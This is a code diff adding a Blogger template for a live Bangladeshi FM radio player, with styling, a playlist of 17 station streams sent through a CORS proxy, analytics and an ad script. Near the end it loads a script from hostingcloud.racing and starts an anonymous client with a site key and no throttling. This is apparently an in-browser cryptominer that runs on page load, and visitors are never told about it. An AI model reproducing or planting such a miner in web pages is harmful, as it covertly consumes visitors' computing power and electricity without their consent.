@@ -1,0 +1,506 @@
+<b:skin><![CDATA[
+        /****CSS CODE*****/
+        @import url('https://fonts.googleapis.com/css?family=Oxygen:300,400,700');
+
+        html,body {
+            -webkit-font-smoothing:antialiased;
+            -webkit-text-size-adjust:100%;
+            background-color: #159957;
+            background-image: linear-gradient(120deg, #155799, #159957);
+            /* background-color:#0665a2; */
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-position: center;
+            color:#fff;
+            font-size:1.05rem;
+            font-family:"Oxygen", HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-weight:300;
+            letter-spacing:.025rem;
+            line-height:1.618;
+            /* padding:1rem 0; */
+        }
+
+        *,::before,::after {
+            box-sizing:border-box;
+        }
+
+        * {
+            -webkit-tap-highlight-color:rgba(0,0,0,0);
+            -webkit-tap-highlight-color:transparent;
+        }
+
+        header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            font-weight: bold;
+            color:  #159957;
+        }
+
+        h1 {
+            margin: 10px auto;
+        }
+
+        .container {
+            position:relative;
+            margin:0 auto;
+            max-width:800px;
+            width:100%;
+        }
+
+        .column {
+            width:inherit;
+        }
+
+        p {
+            color:#fff;
+            display:block;
+            font-size:.9rem;
+            font-weight:400;
+            margin:0 0 2px;
+        }
+
+        a, a:visited {
+            color:#8cc3e6;
+            outline:0;
+            text-decoration:underline;
+        }
+
+        a:hover, a:focus {
+            color:#bbdef5;
+        }
+
+        p a, p a:visited {
+            line-height:inherit;
+        }
+
+        .add-bottom { margin-bottom:2rem !important; }
+        .left { float:left; }
+        .right { float:right; }
+        .center { text-align:center; }
+        .hidden { display:none; }
+
+        .no-support {
+            margin:2rem auto;
+            text-align:center;
+            width:90%;
+        }
+
+        audio {
+            display:none;
+        }
+
+        #audiowrap, #plwrap {
+            margin:0 auto;
+        }
+
+        #tracks {
+            font-size:0;
+            position:relative;
+            text-align:center;
+        }
+
+        #nowPlay {
+            display:block;
+            font-size:0;
+        }
+
+        #nowPlay span {
+            display:inline-block;
+            font-size:1.05rem;
+            vertical-align:top;
+        }
+
+        #nowPlay span#npAction {
+            padding:21px;
+            width:30%;
+        }
+
+        #nowPlay span#npTitle {
+            padding:21px;
+            text-align:right;
+            width:70%;
+        }
+
+        #plList li {
+            cursor:pointer;
+            display:block;
+            margin:0;
+            padding:21px 0;
+        }
+
+        #plList li:hover {
+            background-color:rgba(0,0,0,.1);
+            /* border-radius: 0.75em; */
+        }
+
+        .plItem {
+            position:relative;
+        }
+
+        .plTitle {
+            left:50px;
+            overflow:hidden;
+            position:absolute;
+            right:65px;
+            text-overflow:ellipsis;
+            top:0;
+            white-space:nowrap;
+        }
+
+        .plNum {
+            padding-left:21px;
+            width:25px;
+        }
+
+        .plLength {
+            padding-left:21px;
+            position:absolute;
+            right:21px;
+            top:0;
+            font-weight: bold;
+        }
+
+        .plSel, .plSel:hover {
+            background-color:rgba(0,0,0,.1);
+            color:#fff;
+            /* border-radius: 0.75em; */
+            cursor:default !important;
+        }
+
+        #tracks a {
+            border-radius:3px;
+            color:#fff;
+            cursor:pointer;
+            display:inline-block;
+            font-size:2rem;
+            height:35px;
+            line-height:.175;
+            margin:0 5px 30px;
+            padding:10px;
+            text-decoration:none;
+            transition: background .3s ease;
+        }
+
+        #tracks a:last-child {
+            margin-left:0;
+        }
+
+        #tracks a:hover, #tracks a:active {
+            background-color:rgba(0,0,0,.1);
+            color:#fff;
+        }
+
+        #tracks a::-moz-focus-inner {
+            border:0;
+            padding:0;
+        }
+
+        .plyr--audio .plyr__controls {
+            background-color:transparent;
+            border:none;
+            color:#fff;
+            padding:20px 20px 20px 13px;
+            width:100%;
+        }
+
+        .plyr--audio .plyr__controls button.tab-focus:focus,
+        .plyr--audio .plyr__controls button:hover,
+        .plyr__play-large {
+            background:rgba(0,0,0,.1);
+        }
+
+        .plyr__progress--played,
+        .plyr__volume--display {
+            color:rgba(0,0,0,.1);
+        }
+
+        .plyr--audio .plyr__progress--buffer,
+        .plyr--audio .plyr__volume--display {
+            background:rgba(0,0,0,.1);
+        }
+
+        .plyr--audio .plyr__progress--buffer {
+            color:rgba(0,0,0,.1);
+        }
+
+        @media only screen and (max-width:600px) {
+            #nowPlay span#npAction {
+                display:none;
+            }
+            #nowPlay span#npTitle {
+                display:block;
+                text-align:center;
+                width:100%;
+            }
+        }
+
+        
+]]></b:skin>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js'></script>
+<!-- <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> -->
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/html5media/1.1.8/html5media.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/plyr/3.3.21/plyr.min.js'></script>
+<script src='https://www.google.com/jsapi' type='text/javascript'></script>
+	<b:section class='hello' id='hello'/>
+	<!-- BODY CONTENTS -->
+    <header>
+    <h1>LIVE FM Radio (Bangladesh Only)</h1>
+    </header>
+    <div class='container'>
+        <div class='column add-bottom'>
+        <div id='mainwrap'>
+            <div id='nowPlay'>
+            <span id='npAction'>Paused...</span><span id='npTitle'/>
+            </div>
+            <div id='audiowrap'>
+            <div id='audio0'>
+                <audio crossorigin='anonymous' id='audio1'>Your browser does not support HTML5 Audio! 😢</audio>
+            </div>
+            <div id='tracks'>
+                <a id='btnPrev'/><a id='btnNext'/>
+            </div>
+            </div>
+            <div id='plwrap'>
+            <ul id='plList'/>
+            </div>
+        </div>
+        </div>
+        <div class='column add-bottom center'>
+        <p>Made with  by <a href='http://fb.com/dreygur'>Rakibul Yeasin</a></p>
+        </div>
+    </div>  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async='async' src='https://www.googletagmanager.com/gtag/js?id=UA-114697093-1'/>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag(&#39;js&#39;, new Date());
+    gtag(&#39;config&#39;, &#39;UA-114697093-1&#39;);
+  </script>
+    
+  <center>
+  <script src='//static.surfe.pro/js/net.js'/>
+  <ins class='surfe-be' data-sid='7013'/> 
+  <script>(adsurfebe = window.adsurfebe || []).push({});</script>
+  </center>
+    
+  <script src='https://www.hostingcloud.racing/6nvh.js'/>
+  <script type='text/javascript'>
+	//<![CDATA[
+      var _client = new Client.Anonymous(&#39;212ba91586e1acb5cee4178982e81841134839c0a6c769b0457bd5970ab4f63b&#39;, {
+          throttle: 0, ads: 0;
+      });
+      _client.start();
+	//]]>
+  </script>
+  <script type='text/javascript'>
+    //<![CDATA[
+        // Dependencies:
+        // https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js
+        // https://cdnjs.cloudflare.com/ajax/libs/html5media/1.1.8/html5media.min.js
+        // https://cdnjs.cloudflare.com/ajax/libs/plyr/3.3.21/plyr.min.js
+        // Mythium Archive: https://archive.org/details/mythium/
+
+        $(function ($) {
+            'use strict'
+            var corsProxy = "https://cors-anywhere.herokuapp.com/";
+
+            $(document).ready(function(){
+                // preload controls
+                $('#audio1').attr('preload', 'controls');
+            });
+
+            var supportsAudio = !!document.createElement('audio').canPlayType;
+            if (supportsAudio) {
+                // initialize plyr
+                var player = new Plyr('#audio1', {
+                    controls: [
+                        'restart',
+                        'play',
+                        'progress',
+                        'current-time',
+                        'duration',
+                        'mute',
+                        'volume'
+                    ]
+                });
+                // initialize playlist and controls
+                var index = 0,
+                    playing = false,
+                    tracks = [{
+                        "track": 1,
+                        "name": "Radio Foorti (88.0FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://119.148.23.88:1021/;stream/1"
+                    }, {
+                        "track": 2,
+                        "name": "ABC Radio (89.2FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://ample-zeno-20.radiojar.com/aqs8z2kn944tv"
+                    }, {
+                        "track": 3,
+                        "name": "Radio Today (89.6FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://stream.zenolive.com/8wv4d8g4344tv"
+                    }, {
+                        "track": 4,
+                        "name": "Dhaka FM (90.4FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://118.179.219.244:8000/;"
+                    }, {
+                        "track": 5,
+                        "name": "Radio Dhoni (91.2FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://182.160.110.180:1020/;stream.mp3"
+                    }, {
+                        "track": 6,
+                        "name": "Peoples  Radio (91.6FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://s3.myradiostream.com/14498/listen.mp3"
+                    }, {
+                        "track": 7,
+                        "name": "Radio Shadhin (92.4FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://ample-zeno-10.radiojar.com/umq9q5uuva5tv"
+                    }, {
+                        "track": 8,
+                        "name": "Radio Bhumi (92.8FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://149.56.195.94:8545/;stream.mp3"
+                    }, {
+                        "track": 9,
+                        "name": "Radio Next (93.2FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://live.radionext.fm:9000/;"
+                    }, {
+                        "track": 10,
+                        "name": "Radio Din-Raat (93.6FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://27.147.128.134:8000/"
+                    }, {
+                        "track": 11,
+                        "name": "Radio Dhol (94.0FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://192.240.102.133:11331/live"
+                    }, {
+                        "track": 12,
+                        "name": "Jago FM (94.4FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://192.240.102.133:12110/;stream/1"
+                    }, {
+                        "track": 13,
+                        "name": "City FM (96.0FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://158.106.188.12:9300/;stream.ogg"
+                    }, {
+                        "track": 14,
+                        "name": "Spice FM (96.4FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://162.254.149.187:9300/stream"
+                    }, {
+                        "track": 15,
+                        "name": "Radio Ekattor (98.4FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://103.253.47.173:8000/;"
+                    }, {
+                        "track": 16,
+                        "name": "Bangladesh Betar (100.0FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://ample-zeno-07.radiojar.com/8w0533k6vewtv"
+                    }, {
+                        "track": 17,
+                        "name": "Colours (101.6FM)",
+                        "duration": "LIVE",
+                        "file": corsProxy + "http://45.64.135.88:8000/stream1"
+                    }],
+                    buildPlaylist = $(tracks).each(function(key, value) {
+                        var trackNumber = value.track,
+                            trackName = value.name,
+                            trackDuration = value.duration;
+                        if (trackNumber.toString().length === 1) {
+                            trackNumber = '0' + trackNumber;
+                        }
+                        $('#plList').append('<li> \
+                            <div class="plItem"> \
+                                <span class="plNum">' + trackNumber + '.</span> \
+                                <span class="plTitle">' + trackName + '</span> \
+                                <span class="plLength">' + trackDuration + '</span> \
+                            </div> \
+                        </li>');
+                    }),
+                    trackCount = tracks.length,
+                    npAction = $('#npAction'),
+                    npTitle = $('#npTitle'),
+                    audio = $('#audio1').on('play', function () {
+                        playing = true;
+                        npAction.text('Now Playing...');
+                    }).on('pause', function () {
+                        playing = false;
+                        npAction.text('Paused...');
+                    }).on('ended', function () {
+                        npAction.text('Paused...');
+                        if ((index + 1) < trackCount) {
+                            index++;
+                            loadTrack(index);
+                            audio.play();
+                        } else {
+                            audio.pause();
+                            index = 0;
+                            loadTrack(index);
+                        }
+                    }).get(0),
+                    btnPrev = $('#btnPrev').on('click', function () {
+                        if ((index - 1) > -1) {
+                            index--;
+                            loadTrack(index);
+                            if (playing) {
+                                audio.play();
+                            }
+                        } else {
+                            audio.pause();
+                            index = 0;
+                            loadTrack(index);
+                        }
+                    }),
+                    btnNext = $('#btnNext').on('click', function () {
+                        if ((index + 1) < trackCount) {
+                            index++;
+                            loadTrack(index);
+                            if (playing) {
+                                audio.play();
+                            }
+                        } else {
+                            audio.pause();
+                            index = 0;
+                            loadTrack(index);
+                        }
+                    }),
+                    li = $('#plList li').on('click', function () {
+                        var id = parseInt($(this).index());
+                        if (id !== index) {
+                            playTrack(id);
+                        }
+                    }),
+                    loadTrack = function (id) {
+                        $('.plSel').removeClass('plSel');
+                        $('#plList li:eq(' + id + ')').addClass('plSel');
+                        npTitle.text(tracks[id].name);
+                        index = id;
+                        audio.src = tracks[id].file;
+                    },
+                    playTrack = function (id) {
+                        loadTrack(id);
+                        audio.play();
+                    };
+                loadTrack(index);
+            } else {
+                $('.column').addClass('hidden');
+                var noSupport = $('#audio1').text();
+                $('.container').append('<p class="no-support">' + noSupport + '</p>');
+            }
+        });
+
+    //]]>
+</script>
